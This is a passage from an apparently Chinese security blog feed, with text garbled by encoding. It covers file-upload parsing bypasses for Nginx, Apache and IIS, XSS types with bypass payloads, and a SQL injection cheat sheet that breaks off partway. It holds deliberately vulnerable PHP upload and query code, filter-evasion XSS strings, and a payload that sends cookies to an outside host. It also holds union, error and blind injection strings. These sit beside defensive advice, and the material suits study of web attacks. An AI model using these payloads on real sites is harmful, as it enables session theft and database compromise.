class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    // åˆ¤æ–­å½“æœŸç›®å½•ä¸‹çš„ upload ç›®å½•æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶</span><br><span class="line">    // å¦‚æœæ²¡æœ‰ upload ç›®å½•ï¼Œä½ éœ€è¦åˆ›å»ºå®ƒï¼Œupload ç›®å½•æƒé™ä¸º 777</span><br><span class="line">    if (file_exists(&quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; æ–‡ä»¶å·²ç»å­˜åœ¨ã€‚ &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;PWD: &quot; . `pwd` . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">        // å¦‚æœ upload ç›®å½•ä¸å­˜åœ¨è¯¥æ–‡ä»¶åˆ™å°†æ–‡ä»¶ä¸Šä¼ åˆ° upload ç›®å½•ä¸‹</span><br><span class="line">        $file_path = &quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $success = move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $file_path);</span><br><span class="line">        echo &quot;Stored in: &quot; .$file_path.&quot;&lt;br/&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        if(file_exists($file_path))&#123;</span><br><span class="line">            $str = file_get_contents($file_path);//å°†æ•´ä¸ªæ–‡ä»¶å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</span><br><span class="line">            $str = str_replace(&quot;\r\n&quot;,&quot;&lt;br /&gt;&quot;,$str);</span><br><span class="line">            $str = htmlspecialchars($str);</span><br><span class="line">            echo &quot;File Contents: $str&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>1.php%001.jpg</code>ï¼ŒNginxåœ¨<code>%00</code>æˆªæ–­ï¼Œä¾‹å¦‚ï¼š</p><p>ç”¨%00æˆªæ–­è¿‡ç‹—ï¼š</p><p><img src="/ç»„ä»¶-å®¹å™¨ä¸Šä¼ ç»•è¿‡æ€»ç»“/1544361917866.png" alt="1544361917866"></p><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><p>è®¾ç½®ä¸Šä¼ ç›®å½•ä¸è¢«phpè§£æï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> test.com;</span><br><span class="line">    <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> test.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \/upload\/files\/.*</span> &#123;</span><br><span class="line">        <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># With php7.0-cgi alone:</span></span><br><span class="line">        <span class="comment"># fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment"># With php7.0-fpm:</span></span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ååç¼€é»‘åå•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="2-4-0ä»¥å‰"><a href="#2-4-0ä»¥å‰" class="headerlink" title="2.4.0ä»¥å‰"></a>2.4.0ä»¥å‰</h2><p><code>1.php.xxx</code>Apacheä»åå¾€å‰è§£æï¼Œç›´åˆ°èƒ½è§£æã€‚</p><h2 id="2-4-0-2-4-29"><a href="#2-4-0-2-4-29" class="headerlink" title="2.4.0-2.4.29"></a>2.4.0-2.4.29</h2><p><code>1.php%0A</code>å› ä¸ºä»£ç ä¸­ä¸èƒ½ç”¨<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>è·å–æ–‡ä»¶åï¼Œæ‰€ä»¥åˆ©ç”¨æ¡ä»¶è‹›åˆ»ã€‚</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="6-0"><a href="#6-0" class="headerlink" title="6.0"></a>6.0</h2><ul><li><code>/xx.asp;.jpg</code> IISä¸è§£æ<code>;</code>åé¢çš„å†…å®¹</li><li><code>/1.asp/1.jpg</code> IISå°†<code>.asp</code>æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶è§£æ</li></ul><h2 id="7-5"><a href="#7-5" class="headerlink" title="7.5"></a>7.5</h2><p><code>php.jpg/.php</code> è¦å¼€å¯<code>cgi.fix_pathinfo=1</code></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-ç»„ä»¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> apache </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSç±»å‹ã€åˆ©ç”¨å’Œé˜²å¾¡</title>
      <link href="/xss-XSS%E7%B1%BB%E5%9E%8B%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
      <url>/xss-XSS%E7%B1%BB%E5%9E%8B%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="XSSç±»å‹"><a href="#XSSç±»å‹" class="headerlink" title="XSSç±»å‹"></a>XSSç±»å‹</h1><h2 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h2><p>ç”¨æˆ·è®¿é—®å¸¦æœ‰XSSä»£ç çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨ç«‹å³å°†ä»£ç å‘é€è‡³æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ‰§è¡Œæ¶æ„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1/reflect.php?xss=&lt;script&gt;alert(1);&lt;/script&gt;</span></span><br><span class="line">setcookie(<span class="string">'session'</span>, <span class="string">'qwerty'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/xss-XSSç±»å‹ã€åˆ©ç”¨å’Œé˜²å¾¡/1550126906314.png" alt="1550126906314"></p><h2 id="å­˜å‚¨å‹"><a href="#å­˜å‚¨å‹" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h2><p>XSSä»£ç è¢«ä¿å­˜ï¼ˆè‡³æ•°æ®åº“ï¼‰ï¼Œå¾…é¡µé¢è¢«è®¿é—®æ—¶å†æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span class="string">'action'</span>];</span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$password=$_GET[<span class="string">'password'</span>];</span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"><span class="keyword">if</span>($action==<span class="string">'get'</span>)&#123;</span><br><span class="line">    $sql=<span class="string">"select * from test where username='$name'"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">            print_r($row);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $sql=<span class="string">"insert into test values ('$name', '$password')"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        print_r($result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ’å…¥ä¸€ä¸ªå­˜åœ¨é—®é¢˜çš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=insert&amp;name=anemone&amp;password=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/xss-XSSç±»å‹ã€åˆ©ç”¨å’Œé˜²å¾¡/1550129399199.png" alt="1550129399199"></p><p>æ¥ç€è®¿é—®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=get&amp;name=anemone</span><br></pre></td></tr></table></figure><p><img src="/xss-XSSç±»å‹ã€åˆ©ç”¨å’Œé˜²å¾¡/1550129511724.png" alt="1550129511724"></p><h2 id="DOMå‹"><a href="#DOMå‹" class="headerlink" title="DOMå‹"></a>DOMå‹</h2><p>é€šè¿‡jsæ“æ§domå¼•å…¥xssä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// http://127.0.0.1/dom.php?url=javascript:alert(/xss/)</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> url_search=<span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> the_url = <span class="keyword">new</span> URLSearchParams(url_search).get(<span class="string">'url'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> markup=<span class="string">'&lt;a href="'</span>+the_url+<span class="string">'"&gt;Link&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(markup);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/xss-XSSç±»å‹ã€åˆ©ç”¨å’Œé˜²å¾¡/1550131058571.png" alt="1550131058571"></p><p>å‡ºç°åœºæ™¯ï¼š</p><ul><li>åœ¨å‰ç«¯å®ç°é¡µé¢è·³è½¬ï¼ˆlocation.href=â€™javascript:alert(1)â€™ï¼‰</li><li>å–å€¼å†™å…¥é¡µé¢æˆ–åŠ¨æ€æ‰§è¡Œ <ul><li>div.innerHTML=payload</li><li>eval(payload)</li></ul></li><li>ä½¿ç”¨HTML5 postMessageè¿›è¡Œè·¨åŸŸé€šè®¯ </li></ul><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>å‘é€cookieï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=&lt;script&gt;fetch(&apos;http://127.0.0.2:8888/&apos;.concat(window.btoa(document.cookie)))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨XSSPTå¹³å°ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=%3Cscript%20src=https://xsspt.com/v5Ia54%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><h2 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h2><ol><li><p>ä½¿ç”¨input/img/svgç­‰æ ‡ç­¾å’Œonerror/onload/onfocusç­‰å±æ€§ç»•è¿‡å…³é”®è¯:</p><ul><li><code>&lt;input autofocus id=a name=&quot;javascript:123&quot; onfocus=&quot;alert(1)&quot;&gt;</code></li><li><code>&lt;img/src/onerror=alert(1)&gt;</code></li><li><code>&lt;svg/onload=alert(1)&gt;</code></li><li><code>&lt;video/src/onerror=alert(1)&gt;</code></li><li><code>&lt;video/src/onloadstart=alert(1)&gt;</code></li><li><code>&lt;details/open/ontoggle=alert(1)&gt;</code></li></ul></li><li><p>ä½¿ç”¨concatç»•è¿‡é»‘åå•å•è¯ï¼š</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'javascri'</span>.concat(<span class="string">'pt:aler'</span>,<span class="string">'t(1)'</span>)</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨<code>+</code>ç»•è¿‡ç©ºæ ¼</p></li><li><p>äºŒæ¬¡ç¼–ç </p></li></ol><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>å¼€å¯Cookieçš„HttpOnlyé€‰é¡¹</p><h2 id="åå°„å‹-1"><a href="#åå°„å‹-1" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h2><ul><li><p>ï¼ˆé»˜è®¤é€‰é¡¹ï¼‰æ·»åŠ æµè§ˆå™¨ä¿æŠ¤å¤´éƒ¨<code>x-xss-protection: 1</code></p></li><li><p>æ¸²æŸ“è‡³é¡µé¢æ—¶è¿›è¡Œhtmlencode</p><p><code>htmlspecialchars(&#39;&lt;script&gt;&#39;) =&gt; &amp;lt;script&amp;gt;</code></p></li></ul><h2 id="å­˜å‚¨å‹-1"><a href="#å­˜å‚¨å‹-1" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h2><p>æ¸²æŸ“è‡³é¡µé¢æ—¶è¿›è¡Œhtmlencode</p><h2 id="DOMå‹-1"><a href="#DOMå‹-1" class="headerlink" title="DOMå‹"></a>DOMå‹</h2><p>åœ¨jsä¸­è¿›è¡Œ<code>encodeURI</code>è¿‡æ»¤ï¼Œå¯¹äºæ ‡ç­¾ä¸­çš„å±æ€§ï¼ˆå¦‚ç¤ºä¾‹ä¸­çš„hrefï¼‰ä½¿ç”¨æ­£åˆ™è¿‡æ»¤ã€‚</p><h2 id="æ ·ä¾‹"><a href="#æ ·ä¾‹" class="headerlink" title="æ ·ä¾‹"></a>æ ·ä¾‹</h2><p>è‡³å°‘è¿‡æ»¤å¦‚ä¸‹ç¬¦å·ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">escapeHTML(t)&#123;</span><br><span class="line">    <span class="keyword">return</span> t.replace(<span class="regexp">/&amp;/g</span>,<span class="string">"&amp;amp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&lt;/g</span>,<span class="string">"&amp;lt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&gt;/g</span>,<span class="string">"&amp;gt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/ /g</span>,<span class="string">"&amp;nbsp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/"/g</span>,<span class="string">"&amp;#34;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/'/g</span>,<span class="string">"&amp;#39;"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>é©±æ•£å‰ç«¯å®‰å…¨æ¢¦é­‡â€”â€”DOMXSSå…¸å‹åœºæ™¯åˆ†æä¸ä¿®å¤æŒ‡å—ï¼Œ<a href="https://security.tencent.com/index.php/blog/msg/107" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/107</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-XSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥æ€»ç»“</title>
      <link href="/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="æ³¨å…¥ç±»å‹"><a href="#æ³¨å…¥ç±»å‹" class="headerlink" title="æ³¨å…¥ç±»å‹"></a>æ³¨å…¥ç±»å‹</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><p>æœ€åŸºæœ¬çš„æ³¨å…¥ç±»å‹ï¼Œä»¥MySQLä¸ºä¾‹ï¼Œå‡è®¾æœ‰æ³¨å…¥ç‚¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `test` </span><br><span class="line">WHERE `username`=&apos;admin&apos; and `password`=&apos;*&apos;;</span><br></pre></td></tr></table></figure><h3 id="0x01-åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#0x01-åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="0x01 åˆ¤æ–­æ³¨å…¥ç‚¹"></a>0x01 åˆ¤æ–­æ³¨å…¥ç‚¹</h3><a id="more"></a><p>è‹¥åŸå…ˆèƒ½å¤ŸæŸ¥è¯¢åˆ°æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and &apos;1&apos;=&apos;1&apos;%23    #æœ‰æ•°æ®</span><br><span class="line">admin&apos; and &apos;1&apos;=&apos;2&apos;%23    #æ— æ•°æ®</span><br></pre></td></tr></table></figure><p>è‹¥åŸå…ˆæŸ¥è¯¢ä¸åˆ°æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;%23    #æœ‰æ•°æ®</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;2&apos;%23    #æ— æ•°æ®</span><br></pre></td></tr></table></figure><p>è‹¥ä¸ºæ•´æ•°å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7 &amp;&amp; 1=2 %23</span><br><span class="line">7 &amp;&amp; 1=1 %23</span><br><span class="line">7 || 1=2 %23</span><br><span class="line">7 || 1=2 %23</span><br></pre></td></tr></table></figure><h3 id="0x02-æŸ¥è¯¢å…±æœ‰å¤šå°‘å­—æ®µ"><a href="#0x02-æŸ¥è¯¢å…±æœ‰å¤šå°‘å­—æ®µ" class="headerlink" title="0x02 æŸ¥è¯¢å…±æœ‰å¤šå°‘å­—æ®µ"></a>0x02 æŸ¥è¯¢å…±æœ‰å¤šå°‘å­—æ®µ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1%23 </span><br><span class="line">a&apos; UNION SELECT 1,2%23</span><br><span class="line">a&apos; UNION SELECT 1,2,3%23</span><br></pre></td></tr></table></figure><p>â€¦ç›´åˆ°æ­£å¸¸æ˜¾ç¤ºæ•°æ®ä¸ºæ­¢ï¼Œæˆ–è€…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; ORDER BY 1%23</span><br><span class="line">a&apos; ORDER BY 2%23</span><br><span class="line">a&apos; ORDER BY 3%23</span><br></pre></td></tr></table></figure><p>â€¦ç›´åˆ°ç½‘é¡µæŠ¥é”™ä¸ºæ­¢ã€‚</p><h3 id="0x03-æŸ¥è¯¢åº“"><a href="#0x03-æŸ¥è¯¢åº“" class="headerlink" title="0x03 æŸ¥è¯¢åº“"></a>0x03 æŸ¥è¯¢åº“</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA %23</span><br></pre></td></tr></table></figure><h3 id="0x04-æŸ¥è¯¢è¡¨"><a href="#0x04-æŸ¥è¯¢è¡¨" class="headerlink" title="0x04 æŸ¥è¯¢è¡¨"></a>0x04 æŸ¥è¯¢è¡¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 0,1 %23 #ç¬¬ä¸€ä¸ªè¡¨</span><br><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 1,1 %23 #ç¬¬äºŒä¸ªè¡¨</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-æŸ¥è¯¢å­—æ®µ"><a href="#0x05-æŸ¥è¯¢å­—æ®µ" class="headerlink" title="0x05 æŸ¥è¯¢å­—æ®µ"></a>0x05 æŸ¥è¯¢å­—æ®µ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #ç¬¬ä¸€ä¸ªå­—æ®µ</span><br><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #ç¬¬äºŒä¸ªå­—æ®µ</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-æŸ¥è¯¢è®°å½•"><a href="#0x05-æŸ¥è¯¢è®°å½•" class="headerlink" title="0x05 æŸ¥è¯¢è®°å½•"></a>0x05 æŸ¥è¯¢è®°å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select username,2,3,4,5 from test.test %23</span><br></pre></td></tr></table></figure><h3 id="å…³äºæ³¨é‡Š"><a href="#å…³äºæ³¨é‡Š" class="headerlink" title="å…³äºæ³¨é‡Š"></a>å…³äºæ³¨é‡Š</h3><ul><li><code>#</code>å¯ä»¥æ¢æˆ<code>%23</code></li><li><code>--+</code></li></ul><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>è‹¥æœ‰é”™è¯¯å›æ˜¾çš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨mysqlçš„ä¸€äº›å‡½æ•°ï¼Œå¼•å‘é”™è¯¯ï¼ŒmysqlæŠ¥é”™æ—¶ä¼šå°†å‡½æ•°å‚æ•°çš„å€¼è¿”å›ï¼Œå¦‚ï¼š</p><p><img src="/sqli-SQLæ³¨å…¥æ€»ç»“/1549959620738.png" alt="1549959620738"></p><p>å¸¸ç”¨çš„æŠ¥é”™å‡½æ•°æœ‰ï¼š</p><ul><li><p>updatexml()<br><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p></li><li><p>extractvalue()<br><code>extractvalue(1,concat(0x7e,version(),0x7e))</code></p></li><li><p>floor()<br><code>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p></li><li><p>geometrycollection() ã€multipoint() ã€polygon()ã€multipolygon()ã€linestring()ã€multilinestring() #5.5ä»¥ä¸Šä¸é€‚ç”¨</p><p><code>geometrycollection((select * from(select * from(select user())a)b))</code></p></li><li><p>exp() #5.5ä»¥ä¸Šä¸é€‚ç”¨</p><p><code>exp(~(select * from(select user())a));</code></p></li></ul><h2 id="Bool-Time-Based-ï¼ˆBlind-Basedï¼‰"><a href="#Bool-Time-Based-ï¼ˆBlind-Basedï¼‰" class="headerlink" title="Bool/Time Based ï¼ˆBlind Basedï¼‰"></a>Bool/Time Based ï¼ˆBlind Basedï¼‰</h2><h3 id="Bool-Based"><a href="#Bool-Based" class="headerlink" title="Bool Based"></a>Bool Based</h3><p>è‹¥åŸå…ˆèƒ½å¤Ÿ/ä¸èƒ½æŸ¥è¯¢åˆ°æ•°æ®ï¼Œé‚£ä¹ˆè‹¥çŒœæµ‹å­—æ®µæ­£ç¡®ï¼Œé‚£ä¹ˆç°åœ¨èƒ½å¤Ÿ/ä¸èƒ½æŸ¥è¯¢æ•°æ®ã€‚</p><p>è‹¥åŸå…ˆèƒ½å¤ŸæŸ¥è¯¢åˆ°æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; and length((database()))&lt;8#</span><br><span class="line">*&apos; and ascii(substring((database()),1,1))=100# çŒœæµ‹å­—æ®µ</span><br></pre></td></tr></table></figure><p>è‹¥åŸå…ˆä¸èƒ½æŸ¥è¯¢æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td 